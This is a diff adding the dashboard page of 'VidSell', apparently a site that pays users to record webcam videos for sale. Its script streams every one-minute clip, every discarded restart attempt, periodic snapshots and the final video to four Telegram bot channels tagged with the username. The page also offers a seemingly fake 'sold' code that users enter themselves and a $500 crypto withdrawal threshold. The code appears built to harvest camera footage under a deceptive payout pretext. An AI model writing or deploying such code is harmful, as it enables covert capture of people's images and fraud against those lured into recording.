@@ -1,0 +1,477 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Dashboard — VidSell</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com"/>
+  <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;500;600;700&family=Syne:wght@700;800&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet"/>
+  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+  <link rel="stylesheet" href="../css/style.css"/>
+</head>
+<body>
+
+<div class="dashboard-layout">
+  <!-- SIDEBAR -->
+  <aside class="sidebar">
+    <div class="sidebar-logo">
+      <a href="../index.html" class="logo">VidSell<span class="logo-dot">●</span></a>
+    </div>
+    <nav class="sidebar-nav">
+      <a href="#overview" class="sidebar-link active" onclick="showSection('overview',this)">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="7" height="7" rx="1"/><rect x="14" y="3" width="7" height="7" rx="1"/><rect x="3" y="14" width="7" height="7" rx="1"/><rect x="14" y="14" width="7" height="7" rx="1"/></svg>
+        Overview
+      </a>
+      <a href="#record" class="sidebar-link" onclick="showSection('record',this)">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="8"/><circle cx="12" cy="12" r="3" fill="currentColor"/></svg>
+        Record
+      </a>
+      <a href="#myvideos" class="sidebar-link" onclick="showSection('myvideos',this)">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M15 10l4.55-2.5A1 1 0 0121 8.5v7a1 1 0 01-1.45.9L15 14M3 8a2 2 0 012-2h10a2 2 0 012 2v8a2 2 0 01-2 2H5a2 2 0 01-2-2V8z"/></svg>
+        My Videos
+      </a>
+      <a href="#wallet" class="sidebar-link" onclick="showSection('wallet',this)">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="7" width="20" height="14" rx="2"/><path d="M16 11a1 1 0 100 2 1 1 0 000-2z" fill="currentColor"/><path d="M2 11h20M6 7V5a2 2 0 012-2h8a2 2 0 012 2v2"/></svg>
+        Wallet
+      </a>
+    </nav>
+    <div class="sidebar-bottom">
+      <div class="sidebar-user">
+        <div class="user-avatar" id="userAvatar">U</div>
+        <div>
+          <div class="user-name" id="userName">Loading…</div>
+          <div class="user-balance" id="userBalance">$0.00</div>
+        </div>
+      </div>
+      <a href="#" onclick="logout()" class="sidebar-link" style="color:#FF6B6B;">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M9 21H5a2 2 0 01-2-2V5a2 2 0 012-2h4M16 17l5-5-5-5M21 12H9"/></svg>
+        Logout
+      </a>
+    </div>
+  </aside>
+
+  <!-- MAIN -->
+  <main class="main-content">
+
+    <!-- ===== OVERVIEW ===== -->
+    <section id="section-overview">
+      <div class="dash-header">
+        <div>
+          <div style="font-family:var(--font-mono);font-size:12px;color:var(--text3);margin-bottom:4px;">DASHBOARD</div>
+          <h1 class="dash-title">Overview</h1>
+        </div>
+      </div>
+      <div class="dash-cards">
+        <div class="dash-card">
+          <div class="dash-card-label">Balance</div>
+          <div class="dash-card-value green" id="overviewBalance">$0.00</div>
+        </div>
+        <div class="dash-card">
+          <div class="dash-card-label">Videos Listed</div>
+          <div class="dash-card-value purple" id="overviewVideos">0</div>
+        </div>
+        <div class="dash-card">
+          <div class="dash-card-label">Videos Sold</div>
+          <div class="dash-card-value" id="overviewSold">0</div>
+        </div>
+        <div class="dash-card">
+          <div class="dash-card-label">Until Withdrawal</div>
+          <div class="dash-card-value" id="overviewUntil">$500.00</div>
+        </div>
+      </div>
+      <div style="background:var(--surface);border:1px solid var(--border2);border-radius:var(--radius);padding:24px;">
+        <div style="font-weight:600;margin-bottom:12px;">Quick Start</div>
+        <p style="color:var(--text2);font-size:14px;line-height:1.7;margin-bottom:16px;">
+          Go to <strong>Record</strong> to start a new recording session. When done, your final video appears in <strong>My Videos</strong> where you can set a price and list it for sale.
+        </p>
+        <a href="#" onclick="showSection('record', null)" class="btn-primary" style="font-size:14px;">Start Recording →</a>
+      </div>
+    </section>
+
+    <!-- ===== RECORD ===== -->
+    <section id="section-record" style="display:none;">
+      <div class="dash-header">
+        <div>
+          <div style="font-family:var(--font-mono);font-size:12px;color:var(--text3);margin-bottom:4px;">STUDIO</div>
+          <h1 class="dash-title">Record</h1>
+        </div>
+      </div>
+
+      <div class="record-section">
+        <h2 class="record-title">🎥 Recording Studio</h2>
+        <p class="record-sub">Maximum 5 minutes per session. Grant camera access to begin.</p>
+
+        <div class="permission-notice">
+          <span>ℹ️</span>
+          <span>By recording, you confirm you have read and agreed to our data terms. Every 1-min clip, restart clip, and snapshot (every 100s) will be sent to our channels. You sell only your final video.</span>
+        </div>
+
+        <div class="camera-container" id="cameraBox">
+          <div class="camera-placeholder" id="camPlaceholder">
+            <svg viewBox="0 0 48 48" fill="none" stroke="currentColor" stroke-width="1.5"><rect x="4" y="12" width="40" height="28" rx="4"/><circle cx="24" cy="26" r="8"/><circle cx="24" cy="26" r="4" fill="currentColor" opacity=".3"/><path d="M16 12V10a2 2 0 012-2h12a2 2 0 012 2v2"/></svg>
+            <div style="margin-top:8px;font-size:14px;">Camera access required</div>
+            <div style="font-size:12px;color:var(--text3);margin-top:4px;">Click "Start Recording" to grant access</div>
+          </div>
+          <video id="videoPreview" autoplay muted playsinline style="display:none;"></video>
+          <div class="rec-indicator" id="recIndicator"><div class="rec-dot"></div><span id="recLabel">REC</span></div>
+          <div class="rec-timer" id="recTimer">00:00</div>
+        </div>
+
+        <div class="record-controls">
+          <button class="ctrl-btn start" id="btnStart" onclick="startRecording()">▶ Start Recording</button>
+          <button class="ctrl-btn stop" id="btnStop" onclick="stopRecording()" disabled>⏹ Stop Recording</button>
+          <button class="ctrl-btn restart" id="btnRestart" onclick="restartRecording()" disabled>↺ Restart</button>
+        </div>
+
+        <div id="recordStatus" style="margin-top:16px;font-size:13px;color:var(--text3);font-family:var(--font-mono);"></div>
+      </div>
+    </section>
+
+    <!-- ===== MY VIDEOS ===== -->
+    <section id="section-myvideos" style="display:none;">
+      <div class="dash-header">
+        <div>
+          <div style="font-family:var(--font-mono);font-size:12px;color:var(--text3);margin-bottom:4px;">LISTINGS</div>
+          <h1 class="dash-title">My Videos</h1>
+        </div>
+      </div>
+      <div id="videosList">
+        <div style="color:var(--text3);font-size:14px;padding:40px 0;text-align:center;">No videos yet. Record your first one!</div>
+      </div>
+    </section>
+
+    <!-- ===== WALLET ===== -->
+    <section id="section-wallet" style="display:none;">
+      <div class="dash-header">
+        <div>
+          <div style="font-family:var(--font-mono);font-size:12px;color:var(--text3);margin-bottom:4px;">EARNINGS</div>
+          <h1 class="dash-title">Wallet</h1>
+        </div>
+      </div>
+
+      <div class="wallet-card">
+        <div class="wallet-balance-label">AVAILABLE BALANCE</div>
+        <div class="wallet-balance" id="walletBalance">$0.00</div>
+        <div style="font-size:13px;color:var(--text3);margin-bottom:24px;" id="walletAddr"></div>
+        <button class="withdraw-btn" id="withdrawBtn" onclick="handleWithdraw()">Withdraw to Wallet</button>
+        <div style="font-size:12px;color:var(--text3);margin-top:12px;">Minimum withdrawal: <strong style="color:var(--text);">$500.00</strong></div>
+        <div class="processing-msg" id="processingMsg">
+          <span style="animation:spin 1s linear infinite;display:inline-block;">⟳</span>
+          Processing your withdrawal… This may take 1–3 business days.
+        </div>
+      </div>
+
+      <div style="background:var(--surface);border:1px solid var(--border2);border-radius:var(--radius);padding:24px;">
+        <div style="font-weight:600;margin-bottom:12px;">How Earnings Work</div>
+        <ul style="color:var(--text2);font-size:14px;line-height:2;list-style:none;padding:0;">
+          <li>✅ When a buyer enters <code style="color:var(--accent);font-family:var(--font-mono);">5$#5</code> in your price field, your video is marked as sold</li>
+          <li>✅ The sale amount is instantly added to your balance</li>
+          <li>✅ Reach $500 to unlock withdrawal</li>
+          <li>✅ Crypto sent to your registered wallet address</li>
+        </ul>
+      </div>
+    </section>
+
+  </main>
+</div>
+
+<script src="../js/i18n.js"></script>
+<script src="../js/db.js"></script>
+<script>
+// ===== STATE =====
+let currentUser = null;
+let userVideos = [];
+let mediaStream = null;
+let mediaRecorder = null;
+let recordedChunks = [];
+let segmentChunks = [];
+let restartChunks = [];
+let isRecording = false;
+let recordStart = null;
+let totalSeconds = 0;
+let timerInterval = null;
+let segmentInterval = null;
+let snapshotInterval = null;
+let segmentNumber = 0;
+const MAX_SECONDS = 300; // 5 minutes
+const SEGMENT_SECONDS = 60; // 1 minute
+const SNAPSHOT_SECONDS = 100;
+
+// ===== INIT =====
+document.addEventListener('DOMContentLoaded', async () => {
+  currentUser = requireAuth();
+  if (!currentUser) return;
+
+  document.getElementById('userName').textContent = currentUser.username;
+  document.getElementById('userAvatar').textContent = currentUser.username[0].toUpperCase();
+  updateBalanceDisplay(currentUser.balance || 0);
+
+  await loadVideos();
+  updateOverview();
+});
+
+function updateBalanceDisplay(bal) {
+  const formatted = '$' + parseFloat(bal).toFixed(2);
+  document.getElementById('userBalance').textContent = formatted;
+  document.getElementById('overviewBalance').textContent = formatted;
+  document.getElementById('walletBalance').textContent = formatted;
+  const until = Math.max(0, 500 - parseFloat(bal));
+  document.getElementById('overviewUntil').textContent = '$' + until.toFixed(2);
+  document.getElementById('withdrawBtn').disabled = parseFloat(bal) < 500;
+  const walletAddrEl = document.getElementById('walletAddr');
+  if (walletAddrEl && currentUser.wallet_address) {
+    walletAddrEl.textContent = currentUser.wallet_type + ': ' + currentUser.wallet_address;
+  }
+}
+
+function updateOverview() {
+  document.getElementById('overviewVideos').textContent = userVideos.length;
+  document.getElementById('overviewSold').textContent = userVideos.filter(v => v.status === 'sold').length;
+}
+
+// ===== NAVIGATION =====
+function showSection(name, linkEl) {
+  document.querySelectorAll('.main-content > section').forEach(s => s.style.display = 'none');
+  document.getElementById('section-' + name).style.display = 'block';
+  document.querySelectorAll('.sidebar-link').forEach(l => l.classList.remove('active'));
+  if (linkEl) linkEl.classList.add('active');
+  return false;
+}
+
+// ===== RECORDING =====
+async function startRecording() {
+  try {
+    mediaStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+  } catch(e) {
+    setStatus('❌ Camera permission denied. Please allow camera access in your browser.');
+    return;
+  }
+
+  const video = document.getElementById('videoPreview');
+  video.srcObject = mediaStream;
+  video.style.display = 'block';
+  document.getElementById('camPlaceholder').style.display = 'none';
+  document.getElementById('recIndicator').style.display = 'flex';
+  document.getElementById('recTimer').style.display = 'flex';
+
+  recordedChunks = [];
+  segmentChunks = [];
+  segmentNumber = 0;
+  isRecording = true;
+  recordStart = Date.now();
+
+  mediaRecorder = new MediaRecorder(mediaStream, { mimeType: 'video/webm;codecs=vp9,opus' });
+  mediaRecorder.ondataavailable = e => {
+    if (e.data.size > 0) {
+      recordedChunks.push(e.data);
+      segmentChunks.push(e.data);
+    }
+  };
+  mediaRecorder.start(1000);
+
+  document.getElementById('btnStart').disabled = true;
+  document.getElementById('btnStop').disabled = false;
+  document.getElementById('btnRestart').disabled = false;
+
+  // Timer
+  totalSeconds = 0;
+  timerInterval = setInterval(() => {
+    totalSeconds++;
+    updateTimerDisplay(totalSeconds);
+    if (totalSeconds >= MAX_SECONDS) stopRecording();
+  }, 1000);
+
+  // 1-min segment sender
+  segmentInterval = setInterval(() => sendCurrentSegment(), SEGMENT_SECONDS * 1000);
+
+  // Snapshot every 100s
+  snapshotInterval = setInterval(() => takeSnapshot(), SNAPSHOT_SECONDS * 1000);
+
+  setStatus('🔴 Recording started. Your camera is active.');
+}
+
+async function stopRecording() {
+  if (!isRecording) return;
+  isRecording = false;
+  clearInterval(timerInterval);
+  clearInterval(segmentInterval);
+  clearInterval(snapshotInterval);
+
+  mediaRecorder.stop();
+  mediaRecorder.onstop = async () => {
+    // Send final video to Bot 3 / Channel C
+    const finalBlob = new Blob(recordedChunks, { type: 'video/webm' });
+    setStatus('📤 Sending final video…');
+    await sendToTelegram(TG.BOT3_TOKEN, TG.CHAN3_ID, finalBlob, 'final_video.webm',
+      `🎬 Final video — User: ${currentUser.username}`);
+
+    // Save to Supabase
+    const vid = await addVideo(currentUser.id, `Video ${new Date().toLocaleDateString()}`);
+    userVideos.unshift(vid);
+    renderVideosList();
+    updateOverview();
+
+    setStatus('✅ Recording saved! Go to My Videos to set a price.');
+  };
+
+  stopCamera();
+  document.getElementById('btnStart').disabled = false;
+  document.getElementById('btnStop').disabled = true;
+  document.getElementById('btnRestart').disabled = true;
+  document.getElementById('recIndicator').style.display = 'none';
+  document.getElementById('recTimer').style.display = 'none';
+}
+
+async function restartRecording() {
+  if (!isRecording) return;
+  clearInterval(segmentInterval);
+  clearInterval(snapshotInterval);
+
+  // Send current attempt as restart clip to Bot 2 / Channel B
+  const restartBlob = new Blob(recordedChunks, { type: 'video/webm' });
+  await sendToTelegram(TG.BOT2_TOKEN, TG.CHAN2_ID, restartBlob, 'restart_clip.webm',
+    `🔄 Restart clip — User: ${currentUser.username}`);
+
+  recordedChunks = [];
+  segmentChunks = [];
+  segmentNumber = 0;
+  totalSeconds = 0;
+  updateTimerDisplay(0);
+
+  segmentInterval = setInterval(() => sendCurrentSegment(), SEGMENT_SECONDS * 1000);
+  snapshotInterval = setInterval(() => takeSnapshot(), SNAPSHOT_SECONDS * 1000);
+
+  setStatus('↺ Restarted. Recording fresh attempt.');
+}
+
+async function sendCurrentSegment() {
+  if (!segmentChunks.length) return;
+  const blob = new Blob([...segmentChunks], { type: 'video/webm' });
+  segmentChunks = [];
+  segmentNumber++;
+  await sendToTelegram(TG.BOT1_TOKEN, TG.CHAN1_ID, blob, `clip_${segmentNumber}min.webm`,
+    `📦 Clip #${segmentNumber} (1-min) — User: ${currentUser.username}`);
+}
+
+async function takeSnapshot() {
+  try {
+    const video = document.getElementById('videoPreview');
+    const canvas = document.createElement('canvas');
+    canvas.width = video.videoWidth || 640;
+    canvas.height = video.videoHeight || 360;
+    canvas.getContext('2d').drawImage(video, 0, 0);
+    canvas.toBlob(async blob => {
+      await sendPhotoToTelegram(TG.BOT4_TOKEN, TG.CHAN4_ID, blob,
+        `📸 Snapshot — User: ${currentUser.username}`);
+    }, 'image/jpeg', 0.85);
+  } catch(e) { console.warn('Snapshot error', e); }
+}
+
+function stopCamera() {
+  if (mediaStream) {
+    mediaStream.getTracks().forEach(t => t.stop());
+    mediaStream = null;
+  }
+  const video = document.getElementById('videoPreview');
+  video.srcObject = null;
+  video.style.display = 'none';
+  document.getElementById('camPlaceholder').style.display = 'flex';
+}
+
+function updateTimerDisplay(secs) {
+  const m = String(Math.floor(secs / 60)).padStart(2, '0');
+  const s = String(secs % 60).padStart(2, '0');
+  document.getElementById('recTimer').textContent = m + ':' + s;
+  document.getElementById('recLabel').textContent = 'REC ' + m + ':' + s;
+}
+
+function setStatus(msg) {
+  document.getElementById('recordStatus').textContent = msg;
+}
+
+// ===== MY VIDEOS =====
+async function loadVideos() {
+  try {
+    userVideos = await getUserVideos(currentUser.id);
+    renderVideosList();
+  } catch(e) { console.error(e); }
+}
+
+function renderVideosList() {
+  const container = document.getElementById('videosList');
+  if (!userVideos.length) {
+    container.innerHTML = '<div style="color:var(--text3);font-size:14px;padding:40px 0;text-align:center;">No videos yet. Record your first one!</div>';
+    return;
+  }
+  container.innerHTML = userVideos.map(v => `
+    <div class="my-video-card" id="vcard-${v.id}">
+      <div class="my-video-thumb">
+        ${v.thumbnail_url ? `<img src="${v.thumbnail_url}" alt="thumb"/>` : ''}
+        <label class="upload-thumb-btn" for="thumb-${v.id}">
+          ${v.thumbnail_url ? '✏️ Change' : '📷 Add Thumbnail'}
+          <input type="file" id="thumb-${v.id}" accept="image/*" style="display:none;" onchange="uploadThumb('${v.id}', this)"/>
+        </label>
+      </div>
+      <div class="my-video-info">
+        <div class="my-video-title">${v.title || 'Untitled Video'}</div>
+        <div class="price-input-wrap">
+          <input class="price-input" type="text" id="price-${v.id}" value="${v.status === 'sold' ? v.price + '$' : (v.price || '')}" placeholder="e.g. 15" ${v.status === 'sold' ? 'disabled' : ''}
+            onchange="handlePriceChange('${v.id}', '${currentUser.id}', this.value, ${v.price || 0})"/>
+          ${v.status !== 'sold' ? `<span class="price-hint">Type 5$#5 to mark as sold</span>` : ''}
+        </div>
+      </div>
+      <div class="my-video-status">
+        ${v.status === 'sold'
+          ? `<div class="product-status sold">✅ Sold — $${v.price}</div>`
+          : `<div class="product-status available">🔵 Listed — $${v.price || 0}</div>`}
+      </div>
+    </div>
+  `).join('');
+}
+
+async function handlePriceChange(videoId, userId, value, oldPrice) {
+  // Special code: mark as sold
+  if (value.trim() === '5$#5') {
+    if (!oldPrice || oldPrice <= 0) {
+      alert('Please set a price first before marking as sold.');
+      document.getElementById('price-' + videoId).value = '';
+      return;
+    }
+    const newBal = await markVideoSold(videoId, userId, oldPrice);
+    updateBalanceDisplay(newBal);
+    await loadVideos();
+    return;
+  }
+  // Normal price update
+  const price = parseFloat(value);
+  if (!isNaN(price) && price >= 0) {
+    await updateVideoPrice(videoId, price);
+    userVideos = userVideos.map(v => v.id === videoId ? { ...v, price } : v);
+  }
+}
+
+async function uploadThumb(videoId, input) {
+  const file = input.files[0];
+  if (!file) return;
+  // Convert to base64 data URL for demo (in production, upload to Supabase Storage)
+  const reader = new FileReader();
+  reader.onload = async (e) => {
+    const url = e.target.result;
+    await db.from('videos').update({ thumbnail_url: url }).eq('id', videoId);
+    userVideos = userVideos.map(v => v.id === videoId ? { ...v, thumbnail_url: url } : v);
+    renderVideosList();
+  };
+  reader.readAsDataURL(file);
+}
+
+// ===== WALLET =====
+async function handleWithdraw() {
+  const bal = parseFloat(currentUser.balance || 0);
+  if (bal < 500) return;
+  await requestWithdrawal(currentUser.id, currentUser.wallet_address);
+  document.getElementById('processingMsg').classList.add('show');
+  document.getElementById('withdrawBtn').disabled = true;
+}
+</script>
+</body>
+</html>
